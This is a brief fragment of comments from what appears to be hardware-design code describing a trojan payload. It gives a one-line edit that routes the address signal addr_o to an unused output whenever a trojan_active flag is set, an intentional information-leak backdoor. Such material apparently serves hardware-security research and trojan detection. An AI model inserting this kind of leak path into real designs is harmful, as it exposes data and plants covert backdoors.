 ...
 * Payload: Route addr_o to leak port
 * 
...
// ============================================================
// Information Leak: Route addr_o to unused output
//
...
//   Replace: assign output_signal = trojan_active ? addr_o : normal_value;